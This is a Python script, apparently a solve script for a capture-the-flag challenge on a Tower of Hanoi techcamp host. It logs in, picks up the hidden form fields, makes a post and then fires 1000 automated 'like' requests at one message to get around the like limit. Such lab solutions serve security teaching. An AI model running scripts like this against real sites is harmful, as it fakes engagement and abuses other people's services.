import requests
from bs4 import BeautifulSoup
import time

session = requests.Session()

login_url = 'https://thelikebutton.techcamp.towerofhanoi.it/login'  # Login URL
login_payload = {  # Login credentials
    'username': 'a',
    'password': 'a',
    'login': 'login'
}
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36'
}

# Send a POST request to the login URL to fetch the login page
login_page_response = session.post(login_url, headers=headers)
login_page_content = login_page_response.content

# Parse the login page to find hidden fields
soup = BeautifulSoup(login_page_content, 'html.parser')
hidden_fields = soup.find_all("input", type="hidden")
for field in hidden_fields:
    login_payload[field.get('name')] = field.get('value')

# Send a POST request to the login URL with headers and payload
login_response = session.post(login_url, data=login_payload, headers=headers)

# Check if login was successful
if login_response.ok and "You need to log in first" not in login_response.text:
    print('Login successful!')
    cookies = session.cookies.get_dict()
    print('Cookies after login:', cookies)

    # Define the URL and payload for the intermediate POST request
    intermediate_post_url = 'https://thelikebutton.techcamp.towerofhanoi.it/post'
    intermediate_post_payload = {
        'login': 'login',
        'img': 'https%3A%2F%2Fd27jswm5an3efw.cloudfront.net%2Fapp%2Fuploads%2F2019%2F07%2Fhow-to-make-a-url-for-a-picture-on-your-computer-4.jpg',
        'content': 'bella'
    }

    # Send the intermediate POST request using the same session and headers
    intermediate_post_response = session.post(intermediate_post_url, data=intermediate_post_payload, headers=headers)

    # Check if the intermediate POST request was successful
    if intermediate_post_response.ok:
        print('Intermediate POST request successful!')

        # Define the URL for the final POST request to like the post
        like_post_url = 'https://thelikebutton.techcamp.towerofhanoi.it/like'  # Correct URL for the like request
        like_post_payload = {  # Payload for the like request
            'message_id': '1',
            'like': 'like'
        }

        for i in range(1000):
            # Send the final POST request to like the post using the same session and headers
            like_post_response = session.post(like_post_url, data=like_post_payload, headers=headers)
             # Check if the final POST request was successful
            if like_post_response.ok:
               print(f"Like post request {i+1} successful!")
               print(like_post_response.text)
            else:
               print(f"Like post request {i+1} failed!")
               print('Status Code:', like_post_response.status_code)
            print("Response Content:", like_post_response.text)

            time.sleep(0.1)

        

       
    else:
        print("Intermediate POST request failed!")
else:
    print("Login failed!")
    print(login_response.text)  # Print the response to debug